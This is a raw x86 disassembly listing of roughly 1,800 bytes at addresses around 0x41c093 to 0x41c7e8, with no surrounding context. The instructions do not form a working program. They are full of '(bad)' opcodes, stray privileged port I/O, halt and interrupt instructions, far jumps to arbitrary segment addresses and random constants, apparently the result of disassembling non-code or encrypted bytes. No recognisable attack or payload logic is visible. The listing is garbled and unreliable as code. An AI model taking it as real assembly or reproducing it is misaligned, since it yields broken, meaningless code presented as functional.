  41c093:	xchg   DWORD PTR [ebp+0x49f88d0f],ecx
  41c099:	and    esi,DWORD PTR ds:0x403b14db
  41c09f:	retf   0x9831
  41c0a2:	out    dx,al
  41c0a3:	cld    
  41c0a4:	jg     0x41c086
  41c0a6:	cmc    
  41c0a7:	sbb    ah,ah
  41c0a9:	mov    dl,BYTE PTR [edi]
  41c0ab:	retf   
  41c0ac:	and    al,0xf
  41c0ae:	sar    BYTE PTR [edi-0x3d],1
  41c0b1:	sbb    al,BYTE PTR ss:[ebp+0x34]
  41c0b5:	jo     0x41c107
  41c0b7:	sbb    DWORD PTR [eax+0x52254c66],esi
  41c0bd:	ret    
  41c0be:	in     eax,dx
  41c0bf:	jo     0x41c0aa
  41c0c1:	push   es
  41c0c2:	jge    0x41c0f4
  41c0c4:	inc    ebx
  41c0c5:	lock lods eax,DWORD PTR ds:[esi]
  41c0c7:	mov    dl,0x73
  41c0c9:	pop    edx
  41c0ca:	iret   
  41c0cb:	fidivr WORD PTR [edx]
  41c0cd:	adc    cl,BYTE PTR [edx+0x2c]
  41c0d0:	mov    esp,0x53e366b2
  41c0d5:	push   ds
  41c0d6:	xlat   BYTE PTR ds:[ebx]
  41c0d7:	fild   WORD PTR [ebp-0x2a3af7c1]
  41c0dd:	add    eax,DWORD PTR [edx+0x58]
  41c0e0:	popf   
  41c0e1:	ret    
  41c0e2:	daa    
  41c0e3:	iret   
  41c0e4:	ins    DWORD PTR es:[edi],dx
  41c0e5:	sbb    al,0xc3
  41c0e7:	out    0x18,eax
  41c0e9:	fwait
  41c0ea:	shr    ecx,cl
  41c0ec:	jo     0x41c0ea
  41c0ee:	aam    0x82
  41c0f0:	xlat   BYTE PTR ds:[ebx]
  41c0f1:	inc    edx
  41c0f2:	cmp    DWORD PTR [edx],edx
  41c0f4:	popf   
  41c0f5:	outs   dx,DWORD PTR ds:[esi]
  41c0f6:	and    al,0xaf
  41c0f8:	fst    DWORD PTR [ecx]
  41c0fa:	das    
  41c0fb:	jmp    0x41c12d
  41c0fd:	mov    ah,0xbf
  41c0ff:	hlt    
  41c100:	arpl   WORD PTR [esi],sp
  41c102:	jge    0x41c162
  41c104:	adc    dl,BYTE PTR [ebx+edi*4]
  41c107:	sbb    cl,BYTE PTR [esi+0x2face64b]
  41c10d:	adc    DWORD PTR [ecx-0x7ecc96dc],ebp
  41c113:	mov    ch,0xd1
  41c115:	sti    
  41c116:	std    
  41c117:	mov    ds:0xb2905aa9,eax
  41c11c:	and    DWORD PTR [ebx-0xb98813c],0xffffffee
  41c123:	repz adc al,0x64
  41c126:	jbe    0x41c18f
  41c128:	push   0x17
  41c12a:	sbb    al,0xc
  41c12c:	fst    st(1)
  41c12e:	mov    ecx,0x7277116
  41c133:	jmp    0xc28d:0x944baeb4
  41c13a:	stos   BYTE PTR es:[edi],al
  41c13b:	scas   eax,DWORD PTR es:[edi]
  41c13c:	xchg   esp,eax
  41c13d:	jmp    0xf60f:0x3aa2d2d4
  41c144:	inc    esi
  41c145:	leave  
  41c146:	mov    cl,0xaf
  41c148:	mov    edx,0x14721914
  41c14d:	ins    DWORD PTR es:[edi],dx
  41c14e:	std    
  41c14f:	sbb    DWORD PTR [edi+0xb],eax
  41c152:	out    dx,eax
  41c153:	ficom  WORD PTR [eax+eiz*8]
  41c156:	or     bh,BYTE PTR [ebx-0x221cd31]
  41c15c:	pop    ss
  41c15d:	sbb    esp,esi
  41c15f:	ss retf 0xb282
  41c163:	je     0x41c169
  41c165:	out    dx,al
  41c166:	cdq    
  41c167:	enter  0x4dbe,0x65
  41c16b:	ja     0x41c1b4
  41c16d:	mov    bl,0x3b
  41c16f:	ss xchg edi,eax
  41c171:	push   esp
  41c172:	loopne 0x41c14f
  41c174:	stos   BYTE PTR es:[edi],al
  41c175:	aas    
  41c176:	out    0xb4,eax
  41c178:	inc    ebp
  41c179:	repz mov al,0x3f
  41c17c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c17d:	xchg   edi,eax
  41c17e:	push   cs
  41c17f:	cmc    
  41c180:	xchg   edx,eax
  41c181:	(bad)  
  41c182:	jae    0x41c18d
  41c184:	mov    esp,0x8971d21e
  41c189:	in     al,0x8
  41c18b:	and    eax,esp
  41c18d:	fcomp  st(1)
  41c18f:	cs xor al,0x4a
  41c192:	call   0x9d70:0x26ac9053
  41c199:	pop    eax
  41c19a:	xchg   ebx,eax
  41c19b:	pop    eax
  41c19c:	cmp    esi,DWORD PTR [ecx+0x73]
  41c19f:	mov    bl,0xdf
  41c1a1:	cli    
  41c1a2:	arpl   dx,si
  41c1a4:	cmp    eax,0xbe590980
  41c1a9:	and    DWORD PTR [edi+edi*1-0x1a],ebx
  41c1ad:	(bad)  
  41c1ae:	jne    0x41c222
  41c1b0:	mov    WORD PTR [ebx+0x45d0f3c5],ss
  41c1b6:	push   0x25ded4d6
  41c1bb:	mov    ebx,0x2d7a39be
  41c1c0:	add    DWORD PTR [edi-0x77],edi
  41c1c3:	mov    edi,0x91ae16e3
  41c1c8:	imul   ebp,DWORD PTR [ecx+eiz*2-0x4ceff53a],0x5a
  41c1d0:	(bad)  
  41c1d1:	out    dx,eax
  41c1d2:	mov    ah,0x10
  41c1d4:	ret    
  41c1d5:	adc    ebx,ebp
  41c1d7:	cmp    bl,bh
  41c1d9:	pop    esp
  41c1da:	jl     0x41c251
  41c1dc:	bnd jmp 0x41c250
  41c1df:	cwde   
  41c1e0:	popa   
  41c1e1:	adc    dl,BYTE PTR [edi-0x36a14940]
  41c1e7:	jno    0x41c189
  41c1e9:	mov    WORD PTR [ebx+0x26623e67],ss
  41c1ef:	mov    dh,0xf6
  41c1f1:	dec    edx
  41c1f2:	sahf   
  41c1f3:	push   0x4755ee5d
  41c1f8:	or     al,0xd5
  41c1fa:	scas   eax,DWORD PTR es:[edi]
  41c1fb:	inc    ebp
  41c1fc:	cmp    dh,BYTE PTR [edi]
  41c1fe:	(bad)  
  41c1ff:	out    0xd1,eax
  41c201:	dec    ecx
  41c202:	add    al,0x3d
  41c204:	leave  
  41c205:	std    
  41c206:	hlt    
  41c207:	(bad)  [edx-0x6669cc9b]
  41c20d:	mov    cl,BYTE PTR [ecx+0x10]
  41c210:	inc    edx
  41c211:	fist   WORD PTR [edx+0x6e501a6d]
  41c217:	mov    ebp,0x98cdb241
  41c21c:	cmp    BYTE PTR [ebx],bl
  41c21e:	mov    eax,ds:0xbafd3e86
  41c223:	jne    0x41c1ff
  41c225:	rol    DWORD PTR ds:0xb3be896b,1
  41c22b:	mov    cl,0xa2
  41c22d:	cmc    
  41c22e:	add    esp,0xffffffd6
  41c231:	dec    edi
  41c232:	out    dx,eax
  41c233:	inc    ebp
  41c234:	jne    0x41c233
  41c236:	loop   0x41c1e3
  41c238:	dec    edx
  41c239:	and    esi,DWORD PTR [eax]
  41c23b:	jnp    0x41c1e1
  41c23d:	xchg   ebp,eax
  41c23e:	call   0xa7fe:0x8a055189
  41c245:	lahf   
  41c246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c247:	add    ch,BYTE PTR [ebx]
  41c249:	popa   
  41c24a:	out    0x72,al
  41c24c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c24d:	xlat   BYTE PTR ds:[ebx]
  41c24e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c24f:	mov    DWORD PTR [ebx],esi
  41c251:	mov    edx,0xd260e232
  41c256:	xchg   ecx,eax
  41c257:	xor    eax,0xed515479
  41c25c:	mov    eax,0x1012947f
  41c261:	xor    bl,BYTE PTR [edx]
  41c263:	push   0xfffffff4
  41c265:	aas    
  41c266:	dec    ecx
  41c267:	imul   esi,DWORD PTR [esi],0x5a43af1d
  41c26d:	inc    edx
  41c26e:	das    
  41c26f:	push   edx
  41c270:	sub    eax,0x949605fd
  41c275:	push   ss
  41c276:	lea    esp,[ecx+0x56]
  41c279:	sahf   
  41c27a:	fwait
  41c27b:	(bad)  
  41c27c:	mov    bl,0xdb
  41c27e:	shr    BYTE PTR ds:0x848226ff,0x2d
  41c285:	sub    WORD PTR [ebx],bx
  41c288:	adc    eax,0xb64f9698
  41c28d:	and    BYTE PTR [edx+esi*4-0x61f04fc1],bl
  41c294:	jg     0x41c2cd
  41c296:	jge    0x41c2af
  41c298:	adc    al,0x60
  41c29a:	mov    al,ds:0xa2905a52
  41c29f:	push   cs
  41c2a0:	je     0x41c241
  41c2a2:	loop   0x41c249
  41c2a4:	cli    
  41c2a5:	xor    eax,0x9ba14a16
  41c2aa:	push   esp
  41c2ab:	ror    ecx,0xf4
  41c2ae:	sub    ebp,DWORD PTR [edx+eiz*1-0x46]
  41c2b2:	sahf   
  41c2b3:	rol    bh,1
  41c2b5:	sbb    bh,ch
  41c2b7:	repnz adc eax,DWORD PTR [edi-0x41]
  41c2bb:	jge    0x41c249
  41c2bd:	sub    eax,0xce662e55
  41c2c2:	repnz and eax,0xcfb629f8
  41c2c8:	out    dx,al
  41c2c9:	and    cl,BYTE PTR [edx+0x35c2f5d6]
  41c2cf:	mov    eax,0x49b19943
  41c2d4:	arpl   WORD PTR [ecx-0x740a73e5],sp
  41c2da:	mov    ds:0xc022970f,eax
  41c2df:	ds add dh,bh
  41c2e2:	mov    ds:0x82f3ca18,al
  41c2e7:	jg     0x41c2ad
  41c2e9:	pop    ebp
  41c2ea:	out    dx,eax
  41c2eb:	sbb    eax,0xfcba3d84
  41c2f0:	jl     0x41c35a
  41c2f2:	mov    cl,0x4e
  41c2f4:	bound  edx,QWORD PTR [edi]
  41c2f6:	add    ebp,DWORD PTR [ebx-0x32]
  41c2f9:	ins    BYTE PTR es:[edi],dx
  41c2fa:	xor    ecx,DWORD PTR [ebp+0x6c96dfa6]
  41c300:	jns    0x41c2f8
  41c302:	test   esp,ebx
  41c304:	xor    al,al
  41c306:	jle    0x41c2c7
  41c308:	pop    esi
  41c309:	dec    edx
  41c30a:	outs   dx,DWORD PTR ds:[esi]
  41c30b:	sub    eax,DWORD PTR [eax-0x7d4034aa]
  41c311:	mov    ecx,0x35455b13
  41c316:	loop   0x41c2eb
  41c318:	push   ds
  41c319:	daa    
  41c31a:	push   ebp
  41c31b:	or     eax,0x31fa200d
  41c320:	popa   
  41c321:	(bad)  
  41c322:	mov    al,0xd8
  41c324:	adc    cl,ah
  41c326:	mov    esi,0x166902d1
  41c32b:	and    DWORD PTR [edx+ecx*8],ebp
  41c32e:	cmp    DWORD PTR [edx+0x7a9f6086],0xc48b87ab
  41c338:	push   es
  41c339:	mov    ch,BYTE PTR [ecx+0x8]
  41c33c:	call   0x8e3a:0x68d29a8c
  41c343:	jbe    0x41c38c
  41c345:	push   ebp
  41c346:	cmp    BYTE PTR [esi+0x1ff9ff3],bh
  41c34c:	(bad)  
  41c34d:	pop    edi
  41c34e:	lods   al,BYTE PTR ds:[esi]
  41c34f:	sahf   
  41c350:	dec    ebp
  41c351:	test   al,0xde
  41c353:	outs   dx,BYTE PTR ds:[esi]
  41c354:	dec    edi
  41c355:	and    ah,ah
  41c357:	jge    0x41c3cb
  41c359:	jg     0x41c2e8
  41c35b:	fcomp  QWORD PTR [esi+0x1dbab4b6]
  41c361:	or     esp,DWORD PTR [edi]
  41c363:	cs jno 0x41c370
  41c366:	fidivr DWORD PTR [eax+0x75]
  41c369:	sub    bh,al
  41c36b:	stos   BYTE PTR es:[edi],al
  41c36c:	enter  0x5cdc,0xd3
  41c370:	and    DWORD PTR [ecx],esi
  41c372:	icebp  
  41c373:	pushf  
  41c374:	loop   0x41c348
  41c376:	outs   dx,DWORD PTR ds:[esi]
  41c377:	cmc    
  41c378:	xor    al,0xc4
  41c37a:	cmp    ebx,ebp
  41c37c:	pop    edi
  41c37d:	cmc    
  41c37e:	mov    cl,0xaf
  41c380:	jp     0x41c383
  41c382:	ret    
  41c383:	ret    
  41c384:	call   0xe604:0x2c954b9d
  41c38b:	les    esi,FWORD PTR [edi-0x42f670f]
  41c391:	pop    eax
  41c392:	sbb    eax,0xfe27f41e
  41c397:	pusha  
  41c398:	psllw  mm1,QWORD PTR [ebx]
  41c39b:	je     0x41c3f7
  41c39d:	mov    eax,0x93044fea
  41c3a2:	push   edx
  41c3a3:	mov    ss,WORD PTR [edi+0x43c6168c]
  41c3a9:	push   esp
  41c3aa:	lods   al,BYTE PTR ds:[esi]
  41c3ab:	test   BYTE PTR ds:0x37a9bf94,dl
  41c3b1:	xor    BYTE PTR [edi],bl
  41c3b3:	pop    ecx
  41c3b4:	adc    BYTE PTR [ebp-0x1d16a383],al
  41c3ba:	lods   al,BYTE PTR ds:[esi]
  41c3bb:	jle    0x41c398
  41c3bd:	adc    dh,BYTE PTR [edx+0x11901051]
  41c3c3:	into   
  41c3c4:	xchg   esi,eax
  41c3c5:	sbb    ebx,DWORD PTR [eax+edx*2+0x24]
  41c3c9:	xor    eax,0x449ff8e5
  41c3ce:	loop   0x41c35c
  41c3d0:	icebp  
  41c3d1:	mov    bh,0x73
  41c3d3:	mov    DWORD PTR [esp+ecx*8],eax
  41c3d6:	dec    edx
  41c3d7:	and    eax,0x2c364b3a
  41c3dc:	scas   eax,DWORD PTR es:[edi]
  41c3dd:	out    dx,al
  41c3de:	and    esp,ecx
  41c3e0:	mov    cl,0xe7
  41c3e2:	rol    BYTE PTR [ecx+eiz*4-0x16],1
  41c3e6:	mov    ds:0xc68b2674,al
  41c3eb:	xchg   edi,eax
  41c3ec:	out    dx,al
  41c3ed:	inc    edi
  41c3ee:	mov    dl,0x8b
  41c3f0:	jmp    0x1bcb:0xbb1219fb
  41c3f7:	dec    eax
  41c3f8:	pop    edi
  41c3f9:	push   0xcb8e0bea
  41c3fe:	out    dx,eax
  41c3ff:	jae    0x41c442
  41c401:	mov    al,ds:0xf90dc11f
  41c406:	add    BYTE PTR [ecx*1+0x1c00b7c5],bh
  41c40d:	dec    edi
  41c40e:	jle    0x41c413
  41c410:	xchg   edx,eax
  41c411:	add    eax,0x5b407c91
  41c416:	xchg   DWORD PTR ds:0xdbfdb135,edx
  41c41c:	or     eax,0xdaf70dcc
  41c421:	mul    BYTE PTR [esi-0x6a]
  41c424:	mov    ebp,0x5158a5e3
  41c429:	gs leave 
  41c42b:	pop    es
  41c42c:	out    dx,al
  41c42d:	dec    ebx
  41c42e:	adc    edi,DWORD PTR [ebx+0x3f9d142]
  41c434:	inc    esi
  41c435:	js     0x41c40b
  41c437:	pop    esp
  41c438:	sbb    al,0x5c
  41c43a:	xchg   esp,eax
  41c43b:	scas   eax,DWORD PTR es:[edi]
  41c43c:	neg    DWORD PTR [ebp+0x2c]
  41c43f:	push   0xffffffa1
  41c441:	dec    edx
  41c443:	adc    DWORD PTR [edx+0x46c75e8a],ecx
  41c449:	sub    DWORD PTR [ebx+esi*8-0x4e],0xe6b93f48
  41c451:	adc    BYTE PTR [edi+0x1e],dh
  41c454:	neg    DWORD PTR [ebx]
  41c456:	cdq    
  41c457:	pop    ds
  41c458:	sahf   
  41c459:	leave  
  41c45a:	loope  0x41c49a
  41c45c:	push   edx
  41c45d:	pusha  
  41c45e:	fisttp DWORD PTR [esp+edi*8-0x5c73a365]
  41c465:	addr16 push esp
  41c467:	and    DWORD PTR [ecx+0x1],0xffffffc3
  41c46b:	ja     0x41c460
  41c46d:	test   dl,bh
  41c46f:	dec    eax
  41c470:	lods   eax,DWORD PTR gs:[esi]
  41c472:	push   es
  41c473:	ins    BYTE PTR es:[edi],dx
  41c474:	sub    DWORD PTR [edi-0x45],esp
  41c477:	rol    DWORD PTR [edx-0x7e],0xa1
  41c47b:	dec    esp
  41c47c:	loop   0x41c405
  41c47e:	aaa    
  41c47f:	outs   dx,DWORD PTR ds:[esi]
  41c480:	pop    eax
  41c481:	pop    es
  41c482:	mov    dl,0xa5
  41c484:	pop    edi
  41c485:	inc    ecx
  41c486:	dec    esp
  41c487:	sub    edx,DWORD PTR [edx+0x4d23c8f]
  41c48d:	mov    al,ds:0x64d9d558
  41c492:	and    esp,DWORD PTR [edx]
  41c494:	adc    bl,BYTE PTR [eax+0x7]
  41c497:	and    eax,0x827aac95
  41c49c:	in     al,dx
  41c49d:	dec    edi
  41c49e:	out    dx,al
  41c49f:	dec    esp
  41c4a1:	jl     0x41c4fb
  41c4a3:	push   esi
  41c4a4:	cdq    
  41c4a5:	xchg   esi,eax
  41c4a6:	aad    0x34
  41c4a8:	inc    eax
  41c4a9:	jmp    0x41c436
  41c4ab:	and    eax,0x78de0a18
  41c4b0:	je     0x41c4c6
  41c4b2:	pop    edi
  41c4b3:	in     eax,dx
  41c4b4:	push   ebp
  41c4b5:	pop    edx
  41c4b6:	lea    edx,[edx]
  41c4b8:	shl    BYTE PTR ds:0x19aebb21,0xe2
  41c4bf:	mov    ?,WORD PTR [ebp+0x525483ae]
  41c4c5:	sub    BYTE PTR [edi+0x5845559e],ah
  41c4cb:	ins    BYTE PTR es:[edi],dx
  41c4cc:	into   
  41c4cd:	mov    ch,0x8b
  41c4cf:	cmp    BYTE PTR [esi-0x3],bl
  41c4d2:	jl     0x41c4b9
  41c4d4:	aam    0x39
  41c4d6:	es jl  0x41c4d6
  41c4d9:	imul   edi,DWORD PTR [edx-0x3f],0x26
  41c4dd:	mov    BYTE PTR [ebx-0x6b8171c0],ah
  41c4e3:	mov    bh,0xb8
  41c4e5:	jbe    0x41c49a
  41c4e7:	mov    es,WORD PTR [ecx]
  41c4e9:	repnz lahf 
  41c4eb:	inc    edx
  41c4ec:	mov    ebx,0x7b1311eb
  41c4f1:	mov    dl,BYTE PTR [ebx+0x121b3c53]
  41c4f7:	cmp    bl,0xce
  41c4fa:	loop   0x41c491
  41c4fc:	es xor dh,ch
  41c4ff:	out    0x8c,eax
  41c501:	mov    DWORD PTR [esi+0x5a],ecx
  41c504:	call   0xa24c:0xc45f3416
  41c50b:	and    DWORD PTR [ecx-0x45dc70be],ebx
  41c511:	xor    al,0x5a
  41c513:	(bad)  
  41c514:	mov    ebp,0x39b000f
  41c519:	adc    eax,DWORD PTR [edi]
  41c51b:	repnz pop ebp
  41c51d:	jp     0x41c4ac
  41c51f:	aas    
  41c520:	adc    al,0xea
  41c522:	cmp    BYTE PTR [ebx-0x18],0x15
  41c526:	push   0x61debca1
  41c52b:	sbb    BYTE PTR [ecx],ah
  41c52d:	pop    ebp
  41c52e:	aaa    
  41c52f:	pusha  
  41c530:	push   esi
  41c531:	fild   QWORD PTR [esi]
  41c533:	xchg   eax,ebx
  41c535:	mov    esp,0xe2c2a573
  41c53a:	sub    eax,0xa130d6a8
  41c53f:	pop    edi
  41c540:	jns    0x41c5c1
  41c542:	sbb    al,0xc5
  41c544:	retf   
  41c545:	mov    edx,0x5ee7e863
  41c54a:	jnp    0x41c4f4
  41c54c:	pop    esp
  41c54d:	(bad)  
  41c54e:	pop    esp
  41c54f:	mov    dh,0x8b
  41c551:	sbb    BYTE PTR [edx+ebp*1+0x7bf2e645],al
  41c558:	sbb    DWORD PTR [edx+0x24],edi
  41c55b:	out    dx,al
  41c55c:	cmp    edx,0xfffffff7
  41c55f:	jae    0x41c530
  41c561:	or     al,0x92
  41c563:	data16 mov bh,BYTE PTR [edi+0x117b1e5b]
  41c56a:	icebp  
  41c56b:	inc    esp
  41c56c:	daa    
  41c56d:	cld    
  41c56e:	scas   al,BYTE PTR es:[edi]
  41c56f:	cmp    eax,0xaeb77009
  41c574:	jae    0x41c59c
  41c576:	mov    ds:0x539f4415,eax
  41c57b:	push   esp
  41c57c:	mov    ah,0x25
  41c57e:	loop   0x41c5df
  41c580:	push   ecx
  41c581:	cmc    
  41c582:	(bad)  
  41c583:	mov    edi,0xf4f4f22d
  41c588:	pop    ebx
  41c589:	pop    ds
  41c58a:	sub    ecx,edi
  41c58c:	pop    esp
  41c58d:	cmc    
  41c58e:	aas    
  41c58f:	cli    
  41c590:	repz mov ah,0x48
  41c593:	sbb    DWORD PTR [edx-0x21524467],edi
  41c599:	aam    0x48
  41c59b:	jmp    0x41c59d
  41c59d:	dec    esp
  41c59e:	push   ebp
  41c59f:	push   ecx
  41c5a0:	fld    QWORD PTR [ebp+0x6e]
  41c5a3:	xchg   BYTE PTR [esi+edi*8-0x4b824243],dh
  41c5aa:	das    
  41c5ab:	push   edx
  41c5ac:	ss dec ebp
  41c5ae:	push   0x43c2440c
  41c5b3:	cs push 0x10db9502
  41c5b9:	imul   esp,DWORD PTR [esi+0x33cab14a],0x1b
  41c5c0:	loopne 0x41c5b2
  41c5c2:	push   ecx
  41c5c3:	ret    
  41c5c4:	jg     0x41c5f6
  41c5c6:	dec    ecx
  41c5c7:	test   dh,dh
  41c5c9:	mov    ch,BYTE PTR [esp+esi*1]
  41c5cc:	xchg   ebp,eax
  41c5cd:	outs   dx,BYTE PTR ds:[esi]
  41c5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5cf:	add    dl,BYTE PTR [ebx+0x2619bae6]
  41c5d5:	push   cs
  41c5d6:	call   0xf1ea:0xb5a58c92
  41c5dd:	mov    edi,0xc4b4f760
  41c5e2:	add    eax,0xc953ff65
  41c5e7:	pop    esi
  41c5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5e9:	jp     0x41c63f
  41c5eb:	shl    dh,0x37
  41c5ee:	mov    BYTE PTR [esi-0x4e],ch
  41c5f1:	dec    eax
  41c5f2:	and    al,0x11
  41c5f4:	inc    ecx
  41c5f5:	sub    ch,ch
  41c5f7:	les    esi,FWORD PTR [edi+0x4d]
  41c5fa:	xchg   esi,eax
  41c5fb:	fadd   QWORD PTR [eax]
  41c5fd:	sub    eax,0x8c0a714e
  41c602:	adc    ebp,DWORD PTR [edi+0x4c]
  41c605:	sbb    DWORD PTR [eax+ebp*2-0xa],esi
  41c609:	imul   ebx,DWORD PTR [esi],0x12
  41c60c:	sahf   
  41c60d:	xlat   BYTE PTR ds:[ebx]
  41c60e:	int    0xf5
  41c610:	loop   0x41c62e
  41c612:	(bad)  
  41c613:	shl    DWORD PTR [ebp+0x11],1
  41c616:	dec    esp
  41c617:	pop    ecx
  41c618:	arpl   WORD PTR [ecx+edx*2],dx
  41c61b:	jo     0x41c680
  41c61d:	push   DWORD PTR [esi+0xb]
  41c620:	mov    ebp,0x9103857
  41c625:	(bad)  
  41c626:	retf   
  41c627:	or     BYTE PTR [ecx-0x10770997],dh
  41c62d:	js     0x41c64d
  41c62f:	aad    0x22
  41c631:	jnp    0x41c60f
  41c633:	inc    ecx
  41c634:	jecxz  0x41c6b4
  41c636:	(bad)  
  41c638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c639:	xchg   BYTE PTR ds:0xcab71d73,dh
  41c63f:	pop    esi
  41c640:	(bad)  
  41c641:	fidiv  WORD PTR [eax]
  41c643:	dec    esp
  41c644:	adc    cl,BYTE PTR [eax+0x59]
  41c647:	mov    bl,0x43
  41c649:	or     ah,BYTE PTR ds:[ebx+0x6]
  41c64d:	jae    0x41c689
  41c64f:	(bad)  
  41c650:	and    al,0xd
  41c652:	mov    es,edi
  41c654:	xor    al,0xa4
  41c656:	shr    DWORD PTR [esi],cl
  41c658:	mov    bl,0x16
  41c65a:	cli    
  41c65b:	nop
  41c65c:	sbb    esp,DWORD PTR [eax]
  41c65e:	and    ah,BYTE PTR [ebp-0x3df4955e]
  41c664:	les    ebx,FWORD PTR [esi+0x75d62674]
  41c66a:	push   0xacec165f
  41c66f:	or     BYTE PTR [ecx+0x25d0b720],cl
  41c675:	aad    0x59
  41c677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c678:	mov    ch,0xf1
  41c67a:	cld    
  41c67b:	loopne 0x41c611
  41c67d:	lock sti 
  41c67f:	enter  0x91cf,0xcb
  41c683:	inc    esi
  41c684:	sbb    BYTE PTR [edi],al
  41c686:	inc    ecx
  41c687:	push   ds
  41c688:	cmp    esi,edx
  41c68a:	xchg   ebp,eax
  41c68b:	and    bh,BYTE PTR [ebp-0x762461b2]
  41c691:	adc    DWORD PTR [ecx],ebp
  41c693:	pop    ebx
  41c694:	stos   BYTE PTR es:[edi],al
  41c695:	loopne 0x41c69d
  41c697:	dec    edx
  41c698:	adc    bh,BYTE PTR [edi+ebx*8-0x53]
  41c69c:	jb     0x41c6aa
  41c69e:	xchg   ebx,eax
  41c69f:	lds    ebp,FWORD PTR [ebp+0xc2cc043]
  41c6a5:	cmc    
  41c6a6:	aad    0x39
  41c6a8:	xchg   ecx,eax
  41c6a9:	pop    ds
  41c6aa:	push   eax
  41c6ab:	ds inc esi
  41c6ad:	je     0x41c72e
  41c6af:	xor    BYTE PTR [ebx],cl
  41c6b1:	adc    eax,DWORD PTR [esi+0x7c]
  41c6b4:	fwait
  41c6b5:	adc    ebp,DWORD PTR [edi]
  41c6b7:	nop
  41c6b8:	pushf  
  41c6b9:	inc    ecx
  41c6ba:	sbb    BYTE PTR [eax+eiz*1],ch
  41c6bd:	mov    ds:0x99e417dd,eax
  41c6c2:	aas    
  41c6c3:	jbe    0x41c73d
  41c6c5:	mov    cl,BYTE PTR [edi+0x3986ee4b]
  41c6cb:	xchg   ebp,eax
  41c6cc:	and    eax,0xcf155bd8
  41c6d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6d2:	les    eax,FWORD PTR [ebx]
  41c6d4:	js     0x41c72f
  41c6d6:	sbb    ebp,DWORD PTR [ebx-0x708d46a6]
  41c6dc:	jle    0x41c696
  41c6de:	jns    0x41c703
  41c6e0:	pop    ss
  41c6e1:	sti    
  41c6e2:	fwait
  41c6e3:	jbe    0x41c6ba
  41c6e5:	fucomp st(1)
  41c6e7:	dec    ebx
  41c6e8:	cmp    edx,DWORD PTR [ecx-0x19]
  41c6eb:	and    al,0x1d
  41c6ed:	xchg   DWORD PTR [eax+eiz*1],esp
  41c6f0:	loop   0x41c738
  41c6f2:	xchg   ebp,eax
  41c6f3:	pop    esi
  41c6f4:	test   DWORD PTR ds:0x901efb54,ebx
  41c6fa:	repz cmp BYTE PTR [ebx-0x54],bh
  41c6fe:	xchg   DWORD PTR [eax+0x77025f95],esi
  41c704:	jae    0x41c73d
  41c706:	cli    
  41c707:	(bad)  
  41c708:	std    
  41c709:	les    ebp,FWORD PTR [eax-0x4d]
  41c70c:	gs imul ecx,esi,0x33234211
  41c713:	(bad)  
  41c715:	rol    BYTE PTR [ebx],cl
  41c717:	pop    ss
  41c718:	fidivr DWORD PTR [ecx+edi*2]
  41c71b:	sub    al,0xb6
  41c71d:	xchg   ebp,eax
  41c71e:	jo     0x41c721
  41c720:	dec    eax
  41c721:	inc    ebp
  41c722:	mov    DWORD PTR [edi+0x33],edx
  41c725:	pop    eax
  41c726:	sbb    BYTE PTR [ebp+0x6b],dl
  41c729:	es inc edi
  41c72b:	cli    
  41c72c:	pop    es
  41c72d:	push   ebx
  41c72e:	mov    bl,0xc0
  41c730:	cs call 0xdcb089b1
  41c736:	xchg   DWORD PTR [ecx+0x1678507a],esi
  41c73c:	shr    DWORD PTR [ebx-0x192c7d53],1
  41c742:	fwait
  41c743:	mov    bl,0xb9
  41c745:	js     0x41c714
  41c747:	push   ebp
  41c748:	ins    DWORD PTR es:[edi],dx
  41c749:	fmul   QWORD PTR [eax-0x29c71931]
  41c74f:	aas    
  41c750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c751:	mov    bh,0xe0
  41c753:	add    esi,DWORD PTR [ecx+0x44]
  41c756:	out    0xef,eax
  41c758:	in     eax,dx
  41c759:	cmp    bh,BYTE PTR [ebx-0x2b8d239d]
  41c75f:	jb     0x41c7d7
  41c761:	pop    es
  41c762:	sub    edi,edi
  41c764:	dec    esi
  41c765:	dec    esi
  41c766:	imul   WORD PTR [edx+ebx*8-0x454a8504]
  41c76e:	push   es
  41c76f:	cmp    ebx,ecx
  41c771:	enter  0x9793,0x25
  41c775:	jnp    0x41c75c
  41c777:	or     edx,DWORD PTR [ecx-0x1b]
  41c77a:	cmp    ebp,DWORD PTR [esi-0x1e7d335b]
  41c780:	test   DWORD PTR [edx+eax*1+0x4ed1d598],ebx
  41c787:	mov    cl,BYTE PTR [edx]
  41c789:	mov    ah,BYTE PTR [ecx-0x2]
  41c78c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c78d:	fild   DWORD PTR [eax-0x54]
  41c790:	inc    eax
  41c791:	cli    
  41c792:	adc    ecx,esi
  41c794:	jmp    0x41c772
  41c796:	xchg   edi,eax
  41c797:	sub    eax,0x99dbf49b
  41c79c:	lock pop esp
  41c79e:	jbe    0x41c74c
  41c7a0:	out    0x1a,al
  41c7a2:	push   0x79
  41c7a4:	xor    edx,DWORD PTR [edx-0x4a8b2e4d]
  41c7aa:	mov    bh,0x31
  41c7ac:	cmp    BYTE PTR [ecx-0x2d],0xa0
  41c7b0:	stos   BYTE PTR es:[edi],al
  41c7b1:	aaa    
  41c7b2:	int    0x3a
  41c7b4:	ins    DWORD PTR es:[edi],dx
  41c7b5:	rcl    DWORD PTR [edx+eax*8+0x769d479],cl
  41c7bc:	outs   dx,BYTE PTR ds:[esi]
  41c7bd:	adc    eax,0x1f9dfe50
  41c7c2:	sbb    DWORD PTR [edi+0x35247fd4],ebp
  41c7c8:	xor    cl,BYTE PTR [ebx-0x31a8491c]
  41c7ce:	pop    ss
  41c7cf:	mov    esp,0xae00b8bd
  41c7d4:	mov    bl,0x3a
  41c7d6:	inc    edi
  41c7d7:	leave  
  41c7d8:	xor    DWORD PTR [eax-0xf],edi
  41c7db:	mov    ebx,DWORD PTR [eax+edi*2+0x3c16c72d]
  41c7e2:	daa    
  41c7e3:	and    BYTE PTR [ecx],dh
  41c7e5:	(bad)  
  41c7e6:	aam    0xeb
  41c7e8:	(bad)  
